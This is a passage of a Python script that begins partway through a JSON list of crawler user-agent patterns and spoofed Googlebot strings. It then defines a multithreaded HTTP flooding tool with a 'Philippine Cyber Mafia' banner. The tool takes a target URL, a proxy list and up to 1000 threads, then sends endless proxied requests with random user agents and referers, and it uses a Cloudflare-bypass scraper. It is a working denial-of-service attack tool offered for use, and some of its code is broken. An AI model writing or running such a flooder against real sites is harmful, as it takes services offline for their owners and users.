      "Mozilla/5.0 (compatible; zenback bot; powered by logly +http://corp.logly.co.jp/)"
    ],
    "url": "http://corp.logly.co.jp/"
  },
  {
    "pattern": "SentiBot",
    "addition_date": "2020/03/16",
    "instances": [
      "SentiBot www.sentibot.eu (compatible with Googlebot)"
    ],
    "url": "https://www.sentibot.eu"
  },
  {
    "pattern": "Domains Project\\/",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; Domains Project/1.0.3; +https://github.com/tb0hdan/domains)"
    ],
    "url": "https://github.com/tb0hdan/domains"
  },
  {
    "pattern": "Pandalytics",
    "addition_date": "2020/03/16",
    "instances": [
      "Pandalytics/1.0 (https://domainsbot.com/pandalytics/)"
    ],
    "url": "https://domainsbot.com/pandalytics/"
  },
  {
    "pattern": "VKRobot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; VKRobot/1.0)"
    ]
  },
  {
    "pattern": "bidswitchbot",
    "addition_date": "2020/03/16",
    "instances": [
      "bidswitchbot/1.0"
    ],
    "url": "https://www.bidswitch.com/about-us/"
  },
  {
    "pattern": "tigerbot",
    "addition_date": "2020/03/16",
    "instances": [
      "tigerbot"
    ]
  },
  {
    "pattern": "NIXStatsbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; NIXStatsbot/1.1; +http://www.nixstats.com/bot.html)"
    ],
    "url": "http://www.nixstats.com/bot.html"
  },
  {
    "pattern": "Atom Feed Robot",
    "addition_date": "2020/03/16",
    "instances": [
      "RSSMicro.com RSS/Atom Feed Robot"
    ],
    "url": "https://rssmicro.com"
  },
  {
    "pattern": "Curebot",
    "addition_date": "2020/03/16",
    "instances": [
      "Curebot/1.0"
    ]
  },
  {
    "pattern": "PagePeeker\\/",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 (compatible; PagePeeker/3.0; +https://pagepeeker.com/robots/)"
    ],
    "url": "https://pagepeeker.com/robots/"
  },
  {
    "pattern": "Vigil\\/",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; Vigil/1.0; +http://vigil-app.com/bot.html)"
    ],
    "url": "http://vigil-app.com/bot.html"
  },
  {
    "pattern": "rssbot\\/",
    "addition_date": "2020/03/16",
    "instances": [
      "rssbot/1.4.3 (+https://t.me/RustRssBot)"
    ],
    "url": "https://t.me/RustRssBot"
  },
  {
    "pattern": "startmebot\\/",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; startmebot/1.0; +https://start.me/bot)"
    ],
    "url": "https://start.me/bot"
  },
  {
    "pattern": "JobboerseBot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (X11; U; Linux Core i7-4980HQ; de; rv:32.0; compatible; JobboerseBot; http://www.jobboerse.com/bot.htm) Gecko/20100101 Firefox/38.0"
    ],
    "url": "http://www.jobboerse.com/bot.htm"
  },
  {
    "pattern": "seewithkids",
    "addition_date": "2020/03/16",
    "instances": [
      "http://seewithkids.com/bot"
    ],
    "url": "http://seewithkids.com/bot"
  },
  {
    "pattern": "NINJA bot",
    "addition_date": "2020/03/16",
    "instances": [
      "NINJA bot"
    ]
  },
  {
    "pattern": "Cutbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Cutbot; 1.5; http://cutbot.net/"
    ],
    "url": "http://cutbot.net/"
  },
  {
    "pattern": "BublupBot",
    "addition_date": "2020/03/16",
    "instances": [
      "BublupBot (+https://www.bublup.com/bublup-bot.html)"
    ],
    "url": "https://www.bublup.com/bublup-bot.html"
  },
  {
    "pattern": "BrandONbot",
    "addition_date": "2020/03/16",
    "instances": [
      "BrandONbot (http://brandonmedia.net)"
    ],
    "url": "http://brandonmedia.net"
  },
  {
    "pattern": "RidderBot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; RidderBot/1.0; bot@ridder.co)",
      "Mozilla/5.0 (compatible; RidderBot/1.0; bot@ridder.co) (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) Mobile/12H321"
    ],
    "url": "http://brandonmedia.net"
  },
  {
    "pattern": "Taboolabot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; Taboolabot/3.7; +http://www.taboola.com)"
    ],
    "url": "http://www.taboola.com"
  },
  {
    "pattern": "Dubbotbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; Dubbotbot/0.2; +http://dubbot.com)"
    ],
    "url": "http://dubbot.com"
  },
  {
    "pattern": "FindITAnswersbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible;FindITAnswersbot/1.0;+http://search.it-influentials.com/bot.htm)"
    ],
    "url": "http://search.it-influentials.com/bot.htm"
  },
  {
    "pattern": "infoobot",
    "addition_date": "2020/03/16",
    "instances": [
      "infoobot/0.1 (https://www.infoo.nl/bot.html)"
    ],
    "url": "https://www.infoo.nl/bot.html"
  },
  {
    "pattern": "Refindbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 (Refindbot/1.0)"
    ],
    "url": "https://refind.com/about"
  },
  {
    "pattern": "BlogTraffic\\/\\d\\.\\d+ Feed-Fetcher",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; BlogTraffic/1.4 Feed-Fetcher; +http://www.blogtraffic.de/rss-bot.html)"
    ],
    "url": "http://www.blogtraffic.de/rss-bot.html"
  },
  {
    "pattern": "SeobilityBot",
    "addition_date": "2020/03/16",
    "instances": [
      "SeobilityBot (SEO Tool; https://www.seobility.net/sites/bot.html)"
    ],
    "url": "https://www.seobility.net/sites/bot.html"
  },
  {
    "pattern": "Cincraw",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; Cincraw/1.0; +http://cincrawdata.net/bot/)"
    ],
    "url": "http://cincrawdata.net/bot/"
  },
  {
    "pattern": "Dragonbot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0; Dragonbot; http://www.dragonmetrics.com"
    ],
    "url": "http://www.dragonmetrics.com"
  },
  {
    "pattern": "VoluumDSP-content-bot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; VoluumDSP-content-bot/2.0; +dsp-dev@codewise.com)"
    ],
    "url": "https://codewise.com"
  },
  {
    "pattern": "FreshRSS",
    "addition_date": "2020/03/16",
    "instances": [
      "FreshRSS/1.11.2 (Linux; https://freshrss.org) like Googlebot"
    ],
    "url": "https://freshrss.org"
  },
  {
    "pattern": "BitBot",
    "addition_date": "2020/03/16",
    "instances": [
      "Mozilla/5.0 (compatible; BitBot/v1.19.0; +https://bitbot.dev)"
    ],
    "url": "https://bitbot.dev"
  },
  {
    "pattern": "^PHP-Curl-Class",
    "addition_date": "2020/12/10",
    "instances": [
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.2.24 curl/7.61.1",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.3.19 curl/7.66.0",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.3.23 curl/7.66.0",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.4.7 curl/7.69.1",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.4.9 curl/7.69.1",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.4.10 curl/7.69.1",
      "PHP-Curl-Class/4.13.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.4.11 curl/7.69.1"
    ],
    "url": "https://github.com/php-curl-class/php-curl-class"
  },
  {
    "pattern": "Google-Certificates-Bridge",
    "addition_date": "2020/12/23",
    "instances": [
      "Google-Certificates-Bridge"
    ]
  },
  {
    "pattern": "centurybot",
    "addition_date": "2022/04/26",
    "instances": [
      "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
    ],
    "url": "unknown" 
  },
  {
    "pattern": "Viber",
    "addition_date": "2021/04/27",
    "instances": [
      "Viber"
    ],
    "url": "https://www.viber.com/"
  },
  {
    "pattern": "e\\.ventures Investment Crawler",
    "addition_date": "2021/06/05",
    "instances": [
      "e.ventures Investment Crawler (eventures.vc)"
    ]
  },
  {
    "pattern": "evc-batch",
    "addition_date": "2021/06/07",
    "instances": [
      "Mozilla/5.0 (compatible; evc-batch/2.0)"
    ]
  },
  {
    "pattern": "PetalBot",
    "addition_date": "2021/06/07",
    "instances": [
      "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)",
      "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
    ],
    "url": "https://webmaster.petalsearch.com/site/petalbot"
  },
  {
    "pattern": "virustotal",
    "addition_date": "2021/09/22",
    "instances": [
      "Mozilla\/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US) AppEngine-Google; (+http:\/\/code.google.com\/appengine; appid: s~virustotalcloud)",
      "AppEngine-Google; (+http:\/\/code.google.com\/appengine; appid: s~virustotalcloud)"
    ],
    "url": "https://www.virustotal.com/gui/home/url"
  },
  {
    "pattern": "(^| )PTST\\/",
    "addition_date": "2021/12/05",
    "instances": [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 PTST/211202.211915",
      "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0 PTST/211202.211915"
    ],
    "url": "https://www.webpagetest.org"
  },
  {
    "pattern": "minicrawler",
    "addition_date": "2022/01/12",
    "instances": [
      "Testomatobot/1.0 (Linux x86_64; +https://www.testomato.com/testomatobot) minicrawler/5.2.2"
    ],
    "url": "https://www.testomato.com/bot"
  },
  {
    "pattern": "Cookiebot",
    "addition_date": "2022/01/23",
    "url": "https://www.cookiebot.com/",
    "instances": [
      "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko; compatible; Cookiebot/1.0; +http://cookiebot.com/) Chrome/97.0.4692.71 Safari/537.36"
    ]
  }
]


google_agents = [
    "Mozila/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, "
    "like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html)) "
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"
]

scraper = cfscrape.create_scraper()
	
class fucker(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy
        self.referers = {'Referers' : random.choice(referers)}
        
    def request_cloud(self):
        soso = scraper.get(self.url, timeout=10)
        
    def request_default(self):
        ro = requests.get(self.url, timeout=10, headers={'User-Agent' : random.choice(useragents), 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language' : 'en-US,en;q=0.5', 'Accept-Encoding' : 'gzip, deflate', 'DNT' : '1', 'Referer' : random.choice(referers)})
        
    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print("Fucking the Website => [%s]"%(self.url))
        
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("Connection Proxy Lost...exiting\n")
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
    print(Fore.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
    print(Fore.RED + "█                                                                                            █")
    print(Fore.RED + "█                                                                                            █")
    print(Fore.RED + "█     ██████╗░██╗░░██╗██╗██╗░░░░░██╗██████╗░██████╗░██╗███╗░░██╗███████╗                     █")
    print(Fore.RED + "█     ██╔══██╗██║░░██║██║██║░░░░░██║██╔══██╗██╔══██╗██║████╗░██║██╔════╝                     █")
    print(Fore.RED + "█     ██████╔╝███████║██║██║░░░░░██║██████╔╝██████╔╝██║██╔██╗██║█████╗░░                     █")    
    print(Fore.RED + "█     ██╔═══╝░██╔══██║██║██║░░░░░██║██╔═══╝░██╔═══╝░██║██║╚████║██╔══╝░░                     █")
    print(Fore.RED + "█     ██║░░░░░██║░░██║██║███████╗██║██║░░░░░██║░░░░░██║██║░╚███║███████╗                     █")
    print(Fore.RED + "█                                                                                            █ ")                                                   
    print(Fore.RED + "█                                                                                            █")
    print(Fore.RED + "█                                                                                            █")
    print(Fore.RED + "█      █████╗░██╗░░░██╗██████╗░███████╗██████╗░███╗░░░███╗░█████╗░███████╗██╗░█████╗░        █")
    print(Fore.RED + "█     ██╔══██╗╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗████╗░████║██╔══██╗██╔════╝██║██╔══██╗        █")
    print(Fore.RED + "█     ██║░░╚═╝░╚████╔╝░██████╦╝█████╗░░██████╔╝██╔████╔██║███████║█████╗░░██║███████║        █")
    print(Fore.RED + "█     ██║░░██╗░░╚██╔╝░░██╔══██╗██╔══╝░░██╔══██╗██║╚██╔╝██║██╔══██║██╔══╝░░██║██╔══██║        █")
    print(Fore.RED+'''█     ╚█████╔╝░░░██║░░░██████╦╝███████╗██║░░██║██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║        █''')                                                   
    print(Fore.RED + "█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█")
    print(Fore.RED + "█                           ---[WE ARE BORN TO BE HACKED]---                                 █")
    print(Fore.RED + "█                                                                                            █")
    print(Fore.RED + "▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
    print('')
    
    
    try:
        url = input('Enter URL: ')
    except:
        url = input('Target Example:http://site.com: ')
    
    try:
        file_proxy = str(input('Proxy: '))
        if len(file_proxy) == 0:
                print('Your Proxy list is Empty!')
                exit(0)
        in_file = open(file_proxy,"r")
    except:
            in_file = open(file_proxy,"r")
    num_threads = str(input('Threads: '))
    if int(num_threads) > 1000:
            print('Error in Threading occured you must Lower the Value of threads!')
            num_threads = int(1000)
            print("Thread = 1000")
    else:
            num_threads = int(num_threads)
    for i in range(num_threads):
            in_line = in_file.readline()
            fucker(url, i + 1, in_line).start()
            in_line = in_line[:-1]

                
if __name__ == '__main__':
    MainLoop().home()
